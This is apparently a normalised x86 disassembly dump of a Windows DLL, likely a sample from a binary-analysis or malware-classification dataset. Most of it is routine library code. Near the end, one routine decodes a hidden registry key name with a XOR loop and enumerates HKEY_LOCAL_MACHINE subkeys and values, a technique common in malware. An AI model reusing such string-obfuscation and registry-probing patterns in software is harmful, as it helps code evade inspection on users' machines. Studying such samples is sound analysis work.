mov [ ebp - 0x2c ] 0x0
call sub_100405c0
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] 0xfffffffe
mov [ ebp - 0x34 ] 0x1
mov cl al
mov edx ebx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
mov eax [ ebp - 0x3c ]
call sub_1004642f
retn
mov al [ edi + ebx ]
test al al
je r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
inc [ ebp + 0x10 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov cl [ ebx ]
cmp cl al
jne r-xdata
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
inc edi
mov al [ edi + ebx ]
test al al
jne r-xdata
add edi [ ebp - 0x34 ]
mov al [ edi + ebx ]
cmp al [ ebx ]
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp al cl
je r-xdata
push 0x7f
pop ecx
cmp [ ebp - 0x34 ] ecx
jae r-xdata
test al al
je r-xdata
movsx eax [ eax + esi ]
add edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x34 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_100463af
test al al
jne r-xdata
inc esi
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x3c ] esi
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
cmp ecx 0x7f
jb r-xdata
mov ecx [ ebp - 0x38 ]
cmp [ ecx + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x7f
pop ecx
mov al [ edi + ebx ]
cmp al [ ecx + 0x5 ]
jne r-xdata
call sub_10045d3b
mov ecx [ ebp - 0x38 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_100463af
test al al
jne r-xdata
mov [ eax + esi ] cl
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
call sub_1005f1e2
or [ ebp - 0x3c ] 0xffffffff
jmp r-xdata
xor esi esi
xor edi edi
mov [ ebp - 0x2d ] 0x0
cmp [ ebp + 0x10 ] esi
jbe r-xdata
sub_100073b0
push ebp
mov ebp esp
push esi
push edi
mov esi eax
mov edi ecx
call sub_100202e0
xor edi edi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x7c ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0x8c ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x94 ] ebx
mov [ esi + 0x98 ] edi
mov [ esi + 0x9c ] edi
push ebx
push 0x8
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xa8 ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp + 0x8 ]
xor ecx ecx
cmp eax edi
setne cl
push ebx
push edx
push eax
mov [ esi + 0x90 ] eax
mov [ esi + 0x8 ] ecx
call sub_1007f5d0
add esp 0xc
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10007442
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_10035d06
pop ecx
sub_10007470
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push 0xffffffff
mov esi ecx
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov [ esi ] 0x0
call sub_1004efe0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100074a0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
mov esi ecx
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
push ebx
mov ebx [ ebp + 0x8 ]
cmp eax ebx
jae r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x10
jb r-xdata
mov ecx [ ebp + 0x10 ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
ja r-xdata
push r--data
call sub_1002d84e
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
push r--data
call sub_1000831a
cmp edx 0x10
jb r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
lea edi [ eax + ecx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1000831a
cmp edx 0x10
jb r-xdata
mov edi [ esi + 0x10 ]
add edi ecx
cmp edi eax
jbe r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1003f800
test edi edi
je r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov edx [ ebp + 0x10 ]
push edx
sub eax ecx
push eax
mov eax [ ebp + 0x8 ]
push esi
push eax
mov ecx esi
call sub_10012630
pop edi
pop esi
pop ebp
retn 0xc
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0xc
mov eax [ esi ]
pop ebx
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx ebx
push edx
add eax ebx
add eax [ ebp + 0x10 ]
add ecx ebx
push ecx
push eax
call sub_1007ec90
add esp 0xc
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push ecx
push edx
add eax ebx
push eax
call sub_1007f5d0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_100075f0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
test edx edx
jne r-xdata
push ebx
push esi
push edi
mov edi [ ecx + 0x10 ]
cmp eax edi
jae r-xdata
cmp eax [ ecx + 0x10 ]
jbe r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
sub edi eax
cmp edx edi
ja r-xdata
mov esp ebp
pop ebp
retn 0xc
mov esi 0x1
sub esi edx
add edi esi
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
lea ebx [ ecx + eax ]
mov eax [ ebp + 0x8 ]
movsx ecx [ eax ]
push edi
push ecx
push ebx
call sub_1007f360
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov ecx [ ecx ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push edx
push eax
push esi
call sub_1002b290
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov ecx [ ebp + 0x8 ]
movsx edx [ ecx ]
sub ebx esi
lea edi [ edi + ebx - 0x1 ]
push edi
push edx
lea ebx [ esi + 0x1 ]
push ebx
call sub_1007f360
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
pop edi
mov eax esi
pop esi
sub eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_100076a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084ff3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_10023696
mov eax [ esi + 0x18 ]
add esp 0x4
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x18 ] 0x0
mov [ esi ] r--data
je r-xdata
push eax
call sub_10035d06
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_10007720
push ebp
mov ebp esp
sub esp 0x58
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
inc eax
cmp eax 0x28
jb r-xdata
mov eax [ esi + 0x20 ]
push eax
call [ ReleaseMutex@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x129
call sub_10053240
mov ecx [ esi + 0x20 ]
push ecx
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov [ esi + 0x20 ] 0x0
xor eax eax
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x40 ]
mov eax 0xcd
call sub_10053240
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_100077b0
push ebp
mov ebp esp
push ecx
cmp [ edi ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ LocalFree@IAT ]
push esi
mov edx [ edi ]
push edx
call ebx
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi ]
mov esi [ eax ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
test esi esi
je r-xdata
pop esi
pop ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call ebx
cmp [ esi + 0x20 ] 0x0
je r-xdata
push eax
call ebx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi + 0x20 ] 0x0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push eax
call ebx
sub_10007831
push 0x34
mov eax sub_10085c63
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x3c ] edi
add edi 0x8
push edi
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
push 0x0
push 0x30
mov [ ebp - 0x38 ] eax
call sub_1004a330
add esp 0xc
cmp [ esi + 0x14 ] 0x8
movzx ebx ax
jb r-xdata
push edi
xor edi edi
push edi
push 0x2d
mov [ ebp - 0x34 ] 0x0
call sub_1004a330
add esp 0xc
cmp [ esi ] ax
jne r-xdata
mov esi [ esi ]
movzx eax [ esi ]
cmp bx ax
ja r-xdata
mov [ ebp - 0x34 ] 0x1
add esi 0x2
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10070f14
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
lea ecx [ ebx + 0x9 ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x40 ] esp
push eax
call sub_100627b5
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x3c ]
push [ ebp + 0x1c ]
push [ ebp - 0x38 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x30 ]
call sub_100103de
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003c519
mov eax [ ebp - 0x30 ]
call sub_1004642f
retn 0x1c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10067e0a
inc edi
movzx eax [ esi + edi * 2 ]
cmp bx ax
jbe r-xdata
movzx eax ax
cmp eax ecx
jg r-xdata
sub_10007908
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_1006299d
mov esi [ eax ]
call sub_1006299d
push [ ebp + 0xc ]
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_1001238a
fstp [ ebp - 0x8 ]
pop ecx
pop ecx
call sub_1006299d
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
call sub_1006299d
fld [ r--data ]
mov [ eax ] esi
mov eax [ ebp + 0x10 ]
pop esi
jmp r-xdata
test eax eax
jg r-xdata
fld [ ebp - 0x8 ]
dec eax
fmul st1
fstp [ ebp - 0x8 ]
jns r-xdata
fstp st0
fld [ ebp - 0x8 ]
leave
retn
neg eax
dec eax
fld [ ebp - 0x8 ]
fdiv st1
fstp [ ebp - 0x8 ]
jne r-xdata
sub_10007971
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_1007f9ba
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_100820b0
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_100079d1
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_1001da0a
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10007b46
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_1001462a
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10007a90
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea esi [ eax + 0x1 ]
push esi
call sub_1001df01
add esp 0x4
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov ecx eax
sub ecx edi
lea ecx [ ecx ]
mov dl [ edi ]
mov [ ecx + edi ] dl
inc edi
dec esi
jne r-xdata
sub_10007acd
push 0xc
push r--data
call sub_1007fb20
call sub_10044649
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_10058c10
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_1000150e
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10007b3a
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_10044649
mov esi [ eax + 0x6c ]
mov eax esi
call sub_1007fb65
retn
push 0x20
call sub_1003ca39
sub_10007b46
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10007b80
push ebp
mov ebp esp
push 0xffffffff
push sub_10086e01
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
xor ebx ebx
mov edi edi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp esi ebx
je r-xdata
add esi 0x1c
add edi 0x1c
jmp r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] ax
cmp esi edi
je r-xdata
cmp edi [ ebp + 0xc ]
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
mov eax [ edi ]
mov [ esi ] eax
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
lea edx [ eax + eax + 0x2 ]
push edx
push edi
push esi
call sub_1007ec90
add esp 0xc
jmp r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x14 ] edx
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] ax
sub_10007c43
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_100030fa
dec [ ebp + 0x1c ]
jne r-xdata
sub_10007c70
push ebp
mov ebp esp
push 0xffffffff
push sub_100866ef
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
xor edi edi
push 0x4
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] eax
push edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call [ GetProcessHeap@IAT ]
mov ebx [ HeapAlloc@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] edi
push edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ ebx ]
jne r-xdata
mov edx [ ecx + 0x4 ]
dec [ edx ]
cmp [ edx ] edi
jne r-xdata
mov [ esi + 0x3c ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_1000be60
mov ecx [ ebp + 0x20 ]
mov eax [ ecx ]
mov ebx [ ecx + 0x4 ]
inc [ ebx ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ebx
lea edx [ ebp - 0x18 ]
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x5
cmp ecx edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp eax edi
je r-xdata
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] ebx
inc [ ebx ]
mov ecx [ ecx ]
mov [ ebp + 0x1c ] ecx
cmp ecx edi
je r-xdata
push ebx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
call sub_1001f5f0
mov ecx [ ebp - 0x18 ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ esi + 0x1c ]
cmp ecx edi
je r-xdata
mov eax ecx
call sub_1001f5f0
mov eax [ ebp + 0x1c ]
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x18 ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x18 ]
sub_10007e30
push ebp
mov ebp esp
push 0xffffffff
push sub_1008640c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x18
call sub_1001f84c
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x38 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] esi
mov [ ebp - 0x4 ] 0xffffffff
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x38 ]
call sub_100120f0
mov ebx 0x1
mov [ ebp - 0x10 ] ebx
mov [ esi + 0x4 ] 0x0
push ebx
mov [ ebp - 0x4 ] 0x2
push eax
mov ecx esi
mov [ esi ] r--data
call sub_10053a20
jmp r-xdata
sub_10007ef1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_10007f50
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x14 ]
mov [ edx ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
mov ecx esi
pop esi
jmp sub_10058c50
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
push ecx
call sub_100187af
add esp 0x4
sub_10007fc0
push ebp
mov ebp esp
sub esp 0x958
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x948 ] eax
mov [ ebp - 0x950 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x944 ] edx
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffce
and edx 0xff
mov [ ebp + eax * 2 - 0xbc ] dx
inc eax
cmp eax 0x33
jb r-xdata
push edi
mov edi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0x930 ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0xbc ]
push edx
push 0x80000002
mov [ ebp - 0x56 ] ax
call edi
test eax eax
je r-xdata
mov ecx [ ebp - 0x930 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x938 ]
push eax
push 0x0
push 0x0
push 0x0
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x930 ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x2
pop edi
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x938 ]
test eax eax
je r-xdata
push ebx
push esi
xor esi esi
mov [ ebp - 0x940 ] esi
test eax eax
je r-xdata
mov edx [ ebp - 0x930 ]
push edx
call [ RegCloseKey@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x930 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x958 ]
push edx
lea eax [ ebp - 0x72c ]
push eax
push esi
push ecx
mov [ ebp - 0x958 ] 0xff
call [ RegEnumKeyExW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x930 ]
push ecx
call [ RegCloseKey@IAT ]
pop esi
pop ebx
mov eax 0x3
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x1c ]
mov eax 0x26
call sub_10049e00
lea edx [ ebp - 0x124 ]
mov eax 0x22
call sub_10049e00
lea edx [ ebp - 0x72c ]
push edx
lea eax [ ebp - 0x124 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx 0x104
lea ebx [ ebp - 0x52c ]
call sub_1002cb70
add esp 0xc
lea edx [ ebp - 0x34 ]
mov eax 0x1f
call sub_10049e00
lea edx [ ebp - 0x93c ]
push edx
push 0x20119
push 0x0
mov eax ebx
push eax
push 0x80000002
call edi
test eax eax
jne r-xdata
inc esi
mov [ ebp - 0x940 ] esi
cmp esi [ ebp - 0x938 ]
jb r-xdata
mov ebx [ RegQueryValueExW@IAT ]
lea ecx [ ebp - 0x94c ]
push ecx
mov ecx [ ebp - 0x93c ]
lea edx [ ebp - 0x324 ]
push edx
push eax
push eax
lea eax [ ebp - 0x34 ]
push eax
push ecx
mov [ ebp - 0x94c ] 0x1fe
call ebx
mov esi eax
test esi esi
je r-xdata
mov edx [ ebp - 0x930 ]
push edx
call [ RegCloseKey@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x93c ]
push edx
call [ RegCloseKey@IAT ]
test esi esi
jne r-xdata
mov esi 0x2
mov esi [ ebp - 0x940 ]
lea edx [ ebp - 0x54 ]
lea eax [ esi + 0x27 ]
call sub_10049e00
lea eax [ ebp - 0x934 ]
push eax
